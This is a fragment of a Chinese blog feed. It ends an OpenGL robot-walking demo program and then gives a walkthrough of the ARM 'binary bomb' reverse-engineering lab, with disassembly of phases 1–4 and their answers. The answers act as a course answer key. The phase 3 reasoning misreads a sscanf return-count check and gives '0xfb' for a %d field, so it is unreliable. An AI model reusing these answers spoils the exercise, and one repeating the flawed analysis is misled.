&amp;unTexture); glBindTexture(GL_TEXTURE_2D, unTexture); //设置纹理的信息， glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage-&gt;sizeX, TextureImage-&gt;sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage-&gt;data); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR); //设置滤波为线性滤波 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);//线性滤波 if (TextureImage)//释放资源 &#123; if (TextureImage-&gt;data) &#123; free(TextureImage-&gt;data); &#125; free(TextureImage); &#125; return 1;&#125;int LoadGLTexTures(GLuint&amp; unTexture, const char* chFileName)&#123; AUX_RGBImageRec *TextureImage; //保存贴图数据的指针 TextureImage = auxDIBImageLoadA((LPCSTR)"body.bmp"); //TextureImage_head = auxDIBImageLoadA((LPCSTR)"face.bmp"); glGenTextures(1, &amp;unTexture); glBindTexture(GL_TEXTURE_2D, unTexture); //设置纹理的信息， glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage-&gt;sizeX, TextureImage-&gt;sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage-&gt;data); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR); //设置滤波为线性滤波 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);//线性滤波 if (TextureImage)//释放资源 &#123; if (TextureImage-&gt;data) &#123; free(TextureImage-&gt;data); &#125; free(TextureImage); &#125; return 1;&#125;int LoadGLTexTures_ground(GLuint&amp; unTexture, const char* chFileName)&#123; AUX_RGBImageRec *TextureImage; //保存贴图数据的指针 TextureImage = auxDIBImageLoadA((LPCSTR)"ground.bmp"); //TextureImage_head = auxDIBImageLoadA((LPCSTR)"face.bmp"); glGenTextures(1, &amp;unTexture); glBindTexture(GL_TEXTURE_2D, unTexture); //设置纹理的信息， glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage-&gt;sizeX, TextureImage-&gt;sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage-&gt;data); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR); //设置滤波为线性滤波 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);//线性滤波 if (TextureImage)//释放资源 &#123; if (TextureImage-&gt;data) &#123; free(TextureImage-&gt;data); &#125; free(TextureImage); &#125; return 1;&#125;int LoadGLTexTures_sky(GLuint&amp; unTexture, const char* chFileName)&#123; AUX_RGBImageRec *TextureImage; //保存贴图数据的指针 TextureImage = auxDIBImageLoadA((LPCSTR)"sky.bmp"); //TextureImage_head = auxDIBImageLoadA((LPCSTR)"face.bmp"); glGenTextures(1, &amp;unTexture); glBindTexture(GL_TEXTURE_2D, unTexture); //设置纹理的信息， glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage-&gt;sizeX, TextureImage-&gt;sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage-&gt;data); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR); //设置滤波为线性滤波 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);//线性滤波 if (TextureImage)//释放资源 &#123; if (TextureImage-&gt;data) &#123; free(TextureImage-&gt;data); &#125; free(TextureImage); &#125; return 1;&#125;void DrawGround()&#123; GLfloat y = -GLOBAL_SIZE * leg_x * 2 - GLOBAL_SIZE * foot_y; glBindTexture(GL_TEXTURE_2D, g_texture_ground); glBegin(GL_QUADS); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ + 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ + 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ - 20.0f); glEnd();&#125;void DrawSky()&#123; GLfloat y = 3.5; GLfloat y1 = -GLOBAL_SIZE * leg_x * 2 - GLOBAL_SIZE * foot_y; glBindTexture(GL_TEXTURE_2D, g_texture_sky); glBegin(GL_QUADS); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ + 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ + 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ - 20.0f); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ + 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX - 20.0f, y1, centerZ + 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX - 20.0f, y1, centerZ - 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ + 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX + 20.0f, y1, centerZ + 20.0f); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX + 20.0f, y1, centerZ - 20.0f); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX + 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX + 20.0f, y1, centerZ - 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX - 20.0f, y1, centerZ - 20.0f); glEnd();&#125;void display(void) &#123; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); //清空颜色缓冲和深度缓冲 DrawGround(); DrawSky(); glColor3f(0.8, 0.8, 0.8); glPushMatrix(); //robot的位置和方向设置 glTranslatef(centerX, centerY, centerZ); glRotatef(angle, 0.0, 1.0, 0.0); glColor3f(0.5, 0.5, 0.5); //设置颜色为灰色 glPushMatrix(); //画出左大腿 glColor3f(0.5, 0.5, 0.5); glRotatef((GLfloat)leftHigherLegAngle, 0, 0, 1.0); glTranslatef(0.5*leg_x / 2, 0.0, leg_z * 0.5); glPushMatrix(); glScalef(leg_x, leg_y, leg_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(0.5 * leg_x / 2, 0.0, 0.0); //画关节 glPushMatrix(); glTranslatef(0.0, 0.0, -0.5*leg_z / 2); gluCylinder(quadratic, 0.5 * leg_y / 2, 0.5 * leg_y / 2, leg_z * 0.5, 32, 32); glPopMatrix(); glRotatef(LeftLowerLegAngle, 0.0, 0.0, 1.0); //画左小腿 glTranslatef(0.5*leg_x / 2, 0.0, 0.0); glPushMatrix(); glColor3f(0.5, 0.5, 0.5); glScalef(leg_x - 0.2, leg_y - 0.2, leg_z - 0.2); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(0.5*leg_x / 2, 0.0, 0.0); glRotatef(90, 0.0, 0.0, 1.0); glTranslatef(-0.5*foot_x / 2 + 0.5*foot_y / 2, 0.0, 0.0); glRotatef(leftFootAngle, 0.0, 0.0, 1.0); glPushMatrix(); glScalef(foot_x, foot_y, foot_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glPopMatrix(); glPushMatrix(); //画出右大腿 glColor3f(0.25, 0.45, 0.25); glRotatef((GLfloat)rightHigherLegAngle, 0, 0, 1.0); glTranslatef(leg_x / 4, 0.0, -leg_z / 2); glPushMatrix(); glScalef(leg_x, leg_y, leg_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(leg_x / 4, 0, 0); //画关节 glPushMatrix(); glTranslatef(0.0, 0.0, -leg_z / 4); gluCylinder(quadratic, leg_y / 4, leg_y / 4, leg_z / 2, 32, 32); glPopMatrix(); glRotatef(rightLowerLegAngle, 0.0, 0.0, 1.0); //画左小腿 glTranslatef(leg_x / 4, 0.0, 0.0); glPushMatrix(); glColor3f(0.5, 0.5, 0.5); glScalef(leg_x - 0.2, leg_y - 0.2, leg_z - 0.2); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(leg_x / 4, 0.0, 0.0); glRotatef(90, 0.0, 0.0, 1.0); glTranslatef(-foot_x / 4 + leg_y / 4, 0.0, 0.0); glRotatef(rightFootAngle, 0.0, 0.0, 1.0); glPushMatrix(); glScalef(foot_x, foot_y, foot_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glPopMatrix(); // 身体 glColor3f(1.0, 1.0, 1.0); glPushMatrix(); glColor3f(0.65, 0.45, 0.45); glTranslatef(0, body_y / 4, 0.0); drawCube(body_x, body_y, body_z); glPopMatrix(); glPushMatrix(); //脖子 glColor3f(0.25, 0.75, 0.75); glTranslatef(0, 0.5*body_y, 0); glScalef(neck_x, neck_y, neck_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); // 头部 glPushMatrix(); glColor3f(0.5, 0.5, 0.5); glTranslatef(0, 0.5*body_y + 0.5*head_y, 0); drawCube_head(head_x, head_y, head_z); glPopMatrix(); glColor3f(0.5, 0.55, 0.55); glPushMatrix(); //画左手 glColor3f(0.5, 0.6, 0.6); glTranslatef(0, 0.5*body_y, 0.0); glRotatef(leftHigherHandAngle, 0.0, 0.0, 1.0); glTranslatef(arm_x / 4, 0.0, (body_z + arm_z) / 4); glPushMatrix(); glScalef(arm_x - 0.1, arm_y - 0.1, arm_z - 0.1); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(arm_x / 4, 0.0, 0.0); glPushMatrix(); glColor3f(0.5, 0.55, 0.55); glTranslatef(0.0, 0.0, -arm_z / 4); gluCylinder(quadratic, arm_y / 4, arm_y / 4, arm_z*0.5, 32, 32); glPopMatrix(); glRotatef(leftLowerHandAngle, 0.0, 0.0, 1.0); glTranslatef(arm_x / 4, 0.0, 0.0); glPushMatrix(); glScalef(arm_x - 0.1, arm_y - 0.1, arm_z - 0.1); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glPopMatrix(); glPushMatrix(); //画右手 glColor3f(0.5, 0.55, 0.55); glTranslatef(0, body_y / 2, 0.0); glRotatef(rightHigherHandAngle, 0.0, 0.0, 1.0); glTranslatef(arm_x / 4, 0.0, -(body_z + arm_z) / 4); glPushMatrix(); glScalef(arm_x, arm_y, arm_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(arm_x / 4, 0.0, 0.0); glPushMatrix(); glColor3f(0.5, 0.55, 0.55); glTranslatef(0.0, 0.0, -arm_z / 4); gluCylinder(quadratic, arm_y / 4, arm_y / 4, arm_z*0.5, 32, 32); glPopMatrix(); glRotatef(rightLowerHandAngle, 0.0, 0.0, 1.0); glTranslatef(arm_x / 4, 0.0, 0.0); glPushMatrix(); glScalef(arm_x - 0.1, arm_y - 0.1, arm_z - 0.1); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glPopMatrix(); glPopMatrix(); glFlush(); glutSwapBuffers();&#125;static double lookatx = -3.5, lookatz = -3.5, lookaty = 0;static int scrw, scrh;//实时刷新void reshape(int w, int h) &#123; scrw = w; scrh = h; glViewport(0, 0, (GLsizei)w, (GLsizei)h); glMatrixMode(GL_PROJECTION); glLoadIdentity(); gluPerspective(60.0, (GLfloat)w / (GLfloat)h, 1.0, 200.0); glMatrixMode(GL_MODELVIEW); glLoadIdentity(); gluLookAt(lookatx, lookaty, lookatz, centerX, 0, centerZ, 0.0, 1.0, 0.0);&#125;//响应鼠标事件void passiveMotionFunc(int x, int y) &#123; lookatx = -5.0 + (double)x / scrw * 10.0; lookatz = sqrt(25 - lookatx * lookatx) + centerZ; lookatx += centerX; double tmpy = -5.0 + (double)y / scrh * 10.0; if (tmpy &gt;= -GLOBAL_SIZE * leg_x * 2) lookaty = tmpy; glLoadIdentity(); glutPostRedisplay(); gluLookAt(lookatx, lookaty, lookatz, centerX, 0, centerZ, 0.0, 1.0, 0.0);&#125;bool left = false;//规定当角度大于-75度时，小腿的角度变化，并比大腿变化快，规定是大腿地4倍//响应键盘事件的，当按'w'时先前走，当按's'时为向后转void keyboard(unsigned char key, int x, int y)&#123; switch (key) &#123; case 'w': for (int i = 0; i &lt; speed; i++) &#123; centerY = leg_x * sin(-leftHigherLegAngle / 180.0 * PI) - leg_x; // 为了简化计算，我粗略假定大腿每动1度，人会朝着其方向前进0.035个单位长度 double mvx = cos(angle / 180.0 * PI) * 0.035; // 计算x轴方向移动的距离 double mvz = sin(angle / 180.0 * PI) * 0.035; // 计算z轴方向移动的距离 if (!left) &#123; //左脚迈出 leftHigherLegAngle--; rightHigherLegAngle++; if (leftHigherLegAngle &gt;= -75) &#123; LeftLowerLegAngle += 6; leftFootAngle = 0; &#125; else if (leftHigherLegAngle &lt; -105) LeftLowerLegAngle -= 6; if (leftHigherLegAngle == -120) &#123; left = true; &#125; leftHigherHandAngle++; leftLowerHandAngle++; rightHigherHandAngle--; rightLowerHandAngle--; &#125; else &#123; leftHigherLegAngle++; rightHigherLegAngle--; if (rightHigherLegAngle &gt;= -75) &#123; rightLowerLegAngle += 6; rightFootAngle = 0; &#125; else if (rightHigherLegAngle &lt; -105) rightLowerLegAngle -= 6; if (leftHigherLegAngle == -60) left = false; leftHigherHandAngle--; leftLowerHandAngle--; rightHigherHandAngle++; rightLowerHandAngle++; &#125; centerX -= mvx; lookatx -= mvx; centerZ += mvz; lookatz += mvz; // 调整视角，始终把屏幕中心对准人的中心 glLoadIdentity(); gluLookAt(lookatx, lookaty, lookatz, centerX, 0, centerZ, 0.0, 1.0, 0.0); glutPostRedisplay(); &#125; break; case 's': angle = (angle + 180) % 360; glutPostRedisplay(); break; case 'a': //左转 angle = (angle + 5) % 360; glutPostRedisplay(); break; case 'd': //右转 angle = (angle - 5) % 360; glutPostRedisplay(); break; case 'f': speed++; break; case 'h': if (speed &gt; 0) speed--; break; &#125;&#125;//设置光照 void SetupLights()&#123; GLfloat ambientLight[] = &#123; 0.45f, 0.45f, 0.5f, 1.0f &#125;;//环境光 GLfloat diffuseLight[] = &#123; 0.55f, 0.55f, 0.55f, 1.0f &#125;;//漫反射 GLfloat specularLight[] = &#123; 0.6f, 0.6f, 0.6f, 1.0f &#125;;//镜面光 GLfloat lightPos[] = &#123; 50.0f, 80.0f, 60.0f, 1.0f &#125;;//光源位置 glEnable(GL_LIGHTING); //启用光照 glLightfv(GL_LIGHT0, GL_AMBIENT, ambientLight);//设置环境光源 glLightfv(GL_LIGHT0, GL_DIFFUSE, diffuseLight);//设置漫反射光源 glLightfv(GL_LIGHT0, GL_SPECULAR, specularLight); //设置镜面光源 glLightfv(GL_LIGHT0, GL_POSITION, lightPos);//设置灯光位置 glEnable(GL_LIGHT0);//打开第一个灯光 glEnable(GL_COLOR_MATERIAL);//启用材质的颜色跟踪 glColorMaterial(GL_FRONT, GL_AMBIENT_AND_DIFFUSE); //指定材料着色的面 glMaterialfv(GL_FRONT, GL_SPECULAR, specularLight); //指定材料对镜面光的反应 glMateriali(GL_FRONT, GL_SHININESS, 100); //指定反射系数 &#125;int main(int argc, char **argv) &#123; glutInit(&amp;argc, argv); glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB | GLUT_DEPTH); glutInitWindowSize(500, 500); glutInitWindowPosition(100, 100); glutCreateWindow(argv[0]); init(); LoadGLTexTures(g_texture, "body.bmp"); LoadGLTexTures_head(g_texture_head, "face.bmp"); LoadGLTexTures_ground(g_texture_ground, "ground.bmp"); LoadGLTexTures_sky(g_texture_sky, "sky.bmp"); glutDisplayFunc(display); glutReshapeFunc(reshape); //屏幕刷新是用 glutKeyboardFunc(keyboard);//按下按键 glutPassiveMotionFunc(passiveMotionFunc);//鼠标转动 SetupLights(); glutMainLoop(); return 0;&#125; 实验截图]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>计算机图形学</tag>
        <tag>opengl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bomb]]></title>
    <url>%2F2017%2F05%2F16%2FBomb%2F</url>
    <content type="text"><![CDATA[x86上的二进制炸弹对于反汇编的练习来说还是比较经典的，由于网上有很多该程序的讲解，所以在此我打算写一下arm平台上的二进制拆炸弹这个游戏。 环境的搭建 由于是arm平台的环境，所以需要在linux环境下安装一个模拟器，在此我选择了qemu该模拟器，具体操作如下(该操作对Ubuntu环境有效，其他linux版本可自行查找方法) sudo apt-get install qemu-user 运行ARM指令集模拟器并运行开启gdbserver和运行bomb_1程序 qemu-arm -g 8009 bomb_1 其中，-g参数是为了添加调试信息，为了使远程gdb调试能够起作用，8009为自定义的端口号。 另外启动一个终端，通过命令远程开启gdb调试器并加载待调试程序。 arm-linux-gdb bomb_1 输命令来连接模拟器中的gdbserver target remote localhost:8009 辅助工具IDA pro。IDA pro是一款静态分析的反汇编工具，利用它可以查看数据段的具体数据，用起来十分方便。 具体分析Phase 1Arm指令123456789101112131415160000844c &lt;phase_1&gt;:844c: e92d4800 push &#123;fp, lr&#125;8450: e28db004 add fp, sp, #48454: e24dd008 sub sp, sp, #88458: e50b0008 str r0, [fp, #-8]845c: e51b0008 ldr r0, [fp, #-8]8460: e59f101c ldr r1, [pc, #28] ; 8484 &lt;phase_1+0x38&gt;8464: eb000241 bl 8d70 &lt;strings_not_equal&gt;8468: e1a03000 mov r3, r0846c: e3530000 cmp r3, #08470: 0a000000 beq 8478 &lt;phase_1+0x2c&gt;8474: eb000321 bl 9100 &lt;explode_bomb&gt;8478: e24bd004 sub sp, fp, #4847c: e8bd4800 pop &#123;fp, lr&#125;8480: e12fff1e bx lr8484: 0006483c .word 0x0006483c 反汇编分析从标重点的三行汇编可以看出，该代码从把输入的字符串为参数1，把8484里存的字符串作为参数2，然后再调用函数strings_not_equal,判断两个函数是否相等。所以关键是找8484处的地址存的字符串。有IDA pro可以看出8484处存的是数据段6483c处存的字符串，所以用ida可以找出该处的字符串。 密码 密码为Let’s begin now! 利用gdb及arm服务器验证该答案正确。 Phase 2Arm指令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484900008488 &lt;phase_2&gt;:8488: e92d4800 push &#123;fp, lr&#125;848c: e28db004 add fp, sp, #48490: e24dd028 sub sp, sp, #40 ; 0x288494: e50b0028 str r0, [fp, #-40] ; 0xffffffd88498: e24b3020 sub r3, fp, #32849c: e51b0028 ldr r0, [fp, #-40] ; 0xffffffd884a0: e1a01003 mov r1, r384a4: eb0001f4 bl 8c7c &lt;read_six_numbers&gt; ○1////////////////////////////////////////////////84a8: e51b3020 ldr r3, [fp, #-32] ; 0xffffffe0 84ac: e3530001 cmp r3, #184b0: 0a000000 beq 84b8 &lt;phase_2+0x30&gt; ○284b4: eb000311 bl 9100 &lt;explode_bomb&gt;84b8: e3a03001 mov r3, #184bc: e50b3008 str r3, [fp, #-8]84c0: e51b3008 ldr r3, [fp, #-8]84c4: e2432001 sub r2, r3, #184c8: e3e0301b mvn r3, #2784cc: e1a02102 lsl r2, r2, #284d0: e24b0004 sub r0, fp, #484d4: e0802002 add r2, r0, r284d8: e0823003 add r3, r2, r384dc: e5933000 ldr r3, [r3]84e0: e51b2008 ldr r2, [fp, #-8]84e4: e2421001 sub r1, r2, #1 ○384e8: e0020391 mul r2, r1, r384ec: e51b1008 ldr r1, [fp, #-8]84f0: e3e0301b mvn r3, #2784f4: e1a01101 lsl r1, r1, #284f8: e24b0004 sub r0, fp, #484fc: e0801001 add r1, r0, r18500: e0813003 add r3, r1, r3 ○48504: e5933000 ldr r3, [r3]//////////////////////////////////////////////8508: e1520003 cmp r2, r3850c: 0a000000 beq 8514 &lt;phase_2+0x8c&gt; ○58510: eb0002fa bl 9100 &lt;explode_bomb&gt;//////////////////////////////////////////////8514: e51b3008 ldr r3, [fp, #-8]8518: e2833001 add r3, r3, #1851c: e50b3008 str r3, [fp, #-8]8520: e51b3008 ldr r3, [fp, #-8]8524: e3530005 cmp r3, #58528: daffffe4 ble 84c0 &lt;phase_2+0x38&gt;852c: e24bd004 sub sp, fp, #48530: e8bd4800 pop &#123;fp, lr&#125;8534: e12fff1e bx lr 反汇编分析该炸弹的逻辑是for循环。○1处那两行由函数名可以看出为从终端读取六个数，并将其存入一个数组中，且地址从fp-32开始。○2处那四行是读取数组第一个数判断是否为1，如果是1继续判断，如果不是就会explode_bomb。如果是1 的话就会使i = 1到5，然后判断每一个数值。○3那四行及以上几行的逻辑是取出a[i-1]的值，并将a[i-1]*(i-1),然后存入r2中。○4那两行及以上几行的逻辑是取出a[i]的数据，并将其存入r3中。○5处的逻辑是判断r2和r3的值，如果相等则i+1，继续判断，如果不行等则explode_bomb。其大致的c语言逻辑如下： 12345678if(a[0] != 1) explode_bomb();for(i = 1;i &lt;= 5;i++)&#123; if(a[i] != a[i-1]*(i-1)) explode_bomb();&#125; 所以a[0] = 1;a[1] = a[2] = a[3] = a[4] = a[5] = 0; 密码1 0 0 0 0 0 Phase 3arm指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611700008538 &lt;phase_3&gt;:8538: e92d4800 push &#123;fp, lr&#125;853c: e28db004 add fp, sp, #48540: e24dd020 sub sp, sp, #328544: e50b0018 str r0, [fp, #-24] ; 0xffffffe88548: e51b0018 ldr r0, [fp, #-24] ; 0xffffffe8854c: e59f119c ldr r1, [pc, #412] ; 86f0 &lt;phase_3+0x1b8&gt;○18550: e24b2014 sub r2, fp, #208554: e24b300d sub r3, fp, #138558: e24bc00c sub ip, fp, #12855c: e58dc000 str ip, [sp]8560: eb000976 bl ab40 &lt;_IO_sscanf&gt;8564: e1a03000 mov r3, r08568: e3530002 cmp r3, #2856c: ca000000 bgt 8574 &lt;phase_3+0x3c&gt; ○2 8570: eb0002e2 bl 9100 &lt;explode_bomb&gt;///////////////////////////////////////////////////8574: e51b3014 ldr r3, [fp, #-20] ; 0xffffffec8578: e3530007 cmp r3, #7857c: 979ff103 ldrls pc, [pc, r3, lsl #2]8580: ea000041 b 868c &lt;phase_3+0x154&gt;8584: 000085a4 .word 0x000085a48588: 000085c4 .word 0x000085c4858c: 000085e0 .word 0x000085e0 ○38590: 00008600 .word 0x00008600 8594: 0000861c .word 0x0000861c 8598: 00008638 .word 0x00008638859c: 00008658 .word 0x0000865885a0: 00008670 .word 0x00008670/////////////////////////////////////////////////85a4: e3a03071 mov r3, #113 ; 0x71 ○485a8: e54b3005 strb r3, [fp, #-5]85ac: e51b200c ldr r2, [fp, #-12]85b0: e59f313c ldr r3, [pc, #316] ; 86f4 &lt;phase_3+0x1bc&gt;85b4: e1520003 cmp r2, r385b8: 0a000037 beq 869c &lt;phase_3+0x164&gt;85bc: eb0002cf bl 9100 &lt;explode_bomb&gt;85c0: ea000042 b 86d0 &lt;phase_3+0x198&gt;85c4: e3a03062 mov r3, #98 ; 0x62○585c8: e54b3005 strb r3, [fp, #-5]85cc: e51b300c ldr r3, [fp, #-12]85d0: e35300d6 cmp r3, #214 ; 0xd685d4: 0a000032 beq 86a4 &lt;phase_3+0x16c&gt;85d8: eb0002c8 bl 9100 &lt;explode_bomb&gt;85dc: ea00003b b 86d0 &lt;phase_3+0x198&gt;85e0: e3a03062 mov r3, #98 ; 0x62○685e4: e54b3005 strb r3, [fp, #-5]85e8: e51b200c ldr r2, [fp, #-12]85ec: e59f3104 ldr r3, [pc, #260] ; 86f8 &lt;phase_3+0x1c0&gt;85f0: e1520003 cmp r2, r385f4: 0a00002c beq 86ac &lt;phase_3+0x174&gt;85f8: eb0002c0 bl 9100 &lt;explode_bomb&gt;85fc: ea000033 b 86d0 &lt;phase_3+0x198&gt;8600: e3a0306b mov r3, #107 ; 0x6b ○78604: e54b3005 strb r3, [fp, #-5]8608: e51b300c ldr r3, [fp, #-12]860c: e35300fb cmp r3, #251 ; 0xfb8610: 0a000027 beq 86b4 &lt;phase_3+0x17c&gt;8614: eb0002b9 bl 9100 &lt;explode_bomb&gt;8618: ea00002c b 86d0 &lt;phase_3+0x198&gt;861c: e3a0306f mov r3, #111 ; 0x6f○88620: e54b3005 strb r3, [fp, #-5]8624: e51b300c ldr r3, [fp, #-12]8628: e35300a0 cmp r3, #160 ; 0xa0862c: 0a000022 beq 86bc &lt;phase_3+0x184&gt;8630: eb0002b2 bl 9100 &lt;explode_bomb&gt;8634: ea000025 b 86d0 &lt;phase_3+0x198&gt;8638: e3a03074 mov r3, #116 ; 0x74○9863c: e54b3005 strb r3, [fp, #-5]8640: e51b200c ldr r2, [fp, #-12]8644: e59f30b0 ldr r3, [pc, #176] ; 86fc &lt;phase_3+0x1c4&gt;8648: e1520003 cmp r2, r3864c: 0a00001c beq 86c4 &lt;phase_3+0x18c&gt;8650: eb0002aa bl 9100 &lt;explode_bomb&gt;8654: ea00001d b 86d0 &lt;phase_3+0x198&gt;8658: e3a03076 mov r3, #118 ; 0x76○10865c: e54b3005 strb r3, [fp, #-5]8660: e51b300c ldr r3, [fp, #-12]8664: e3530fc3 cmp r3, #780 ; 0x30c8668: 0a000000 beq 8670 &lt;phase_3+0x138&gt;866c: eb0002a3 bl 9100 &lt;explode_bomb&gt;8670: e3a03062 mov r3, #98 ; 0x62○118674: e54b3005 strb r3, [fp, #-5]8678: e51b300c ldr r3, [fp, #-12]867c: e3530f83 cmp r3, #524 ; 0x20c8680: 0a000011 beq 86cc &lt;phase_3+0x194&gt;8684: eb00029d bl 9100 &lt;explode_bomb&gt;8688: ea000010 b 86d0 &lt;phase_3+0x198&gt;868c: e3a03078 mov r3, #120 ;0x78 ○128690: e54b3005 strb r3, [fp, #-5]8694: eb000299 bl 9100 &lt;explode_bomb&gt;8698: ea00000c b 86d0 &lt;phase_3+0x198&gt;869c: e1a00000 nop ; (mov r0, r0)86a0: ea00000a b 86d0 &lt;phase_3+0x198&gt;86a4: e1a00000 nop ; (mov r0, r0)86a8: ea000008 b 86d0 &lt;phase_3+0x198&gt;86ac: e1a00000 nop ; (mov r0, r0)86b0: ea000006 b 86d0 &lt;phase_3+0x198&gt;86b4: e1a00000 nop ; (mov r0, r0)86b8: ea000004 b 86d0 &lt;phase_3+0x198&gt;86bc: e1a00000 nop ; (mov r0, r0)86c0: ea000002 b 86d0 &lt;phase_3+0x198&gt;86c4: e1a00000 nop ; (mov r0, r0)86c8: ea000000 b 86d0 &lt;phase_3+0x198&gt;86cc: e1a00000 nop ; (mov r0, r0)86d0: e55b300d ldrb r3, [fp, #-13]86d4: e55b2005 ldrb r2, [fp, #-5]86d8: e1520003 cmp r2,r3○1386dc: 0a000000 beq 86e4 &lt;phase_3+0x1ac&gt;86e0: eb000286 bl 9100 &lt;explode_bomb&gt;86e4: e24bd004 sub sp, fp, #486e8: e8bd4800 pop &#123;fp, lr&#125;86ec: e12fff1e bx lr86f0: 00064850 .word 0x0006485086f4: 00000309 .word 0x0000030986f8: 000002f3 .word 0x000002f386fc: 000001ca .word 0x000001ca 反汇编分析○1处将pc+412的数据传入r1，借助IDA pro可以查看pc+412引用的是00064850处的数据，如图： 所以该处的数据为”%d %c %d”,由此可知输入的数据的形式为int，char，int。○2处判断第一个参数int是否大于2，如果大于2则进行switch操作，如果不是则explode_bomb。○3处是对输入的第一个int进行switch判断，其伪代码如下： 123456789101112131415161718192021222324252627282930switch(int c)&#123; case 0: jmp 85a4; break; case 1: jmp 85c4; break; case 2: jmp 85e0; break; case 3: jmp 8600; break; case 4: jmp 861c; break; case 5: jmp 8638; break; case 6: jmp 8658; break; case 7: jmp 8670; break; default: jmp 868c; break; &#125; ○4-○11是对case 0 –case 7这八种情况的具体判断，其逻辑都是一样的，所以在此只分析一种情况（由于必须要求第一个int大于2，所以分析为3,4,5,6,7这五种情况）。现分析○7，首先将0x6b放入fp-5,然后将fp-12的值(即第三个传入的int的值)与0xfb(十进制为251)进行比较，如果相等则跳转86b4,如果不是的话就会explode_bomb;然后相等的话跳转86b4，我们发现从869c到86cc的逻辑都是先nop，什么都不做，然后再b 86d0 ，所以现在就到了86d0的代码块○13，其逻辑为先取fp-13(输入的第二个参数char)放到r3，然后再去fp-5的值放到r2，其中fp-5的值为刚才放的0x6b，查ascii表为k，所以结果就为3 k 0xfb,其余的case 为4,5,6,7的情况和case 3的情况类似。代码○12为default情况，其逻辑是先把0x78存入fp-5,然后就explode_bomb;所以总之就是default情况就会碰到炸弹。 密码3 k 0xfb Phase 4Arm指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596000008760 &lt;phase_4&gt;:8760: e92d4800 push &#123;fp, lr&#125;8764: e28db004 add fp, sp, #48768: e24dd010 sub sp, sp, #16876c: e50b0010 str r0, [fp, #-16]8770: e51b1010 ldr r1, [fp, #-16]8774: e59f2054 ldr r2, [pc, #84] ; 87d0 &lt;phase_4+0x70&gt; ○18778: e24b3008 sub r3, fp, #8877c: e1a00001 mov r0, r18780: e1a01002 mov r1, r28784: e1a02003 mov r2, r38788: eb0008ec bl ab40 &lt;_IO_sscanf&gt;878c: e1a03000 mov r3, r08790: e3530001 cmp r3, #18794: 1a000002 bne 87a4 &lt;phase_4+0x44&gt;8798: e51b3008 ldr r3, [fp, #-8]879c: e3530000 cmp r3, #087a0: ca000000 bgt 87a8 &lt;phase_4+0x48&gt; ○2 87a4: eb000255 bl 9100 &lt;explode_bomb&gt;////////////////////////////////////87a8: e51b3008 ldr r3, [fp, #-8]87ac: e1a00003 mov r0, r3 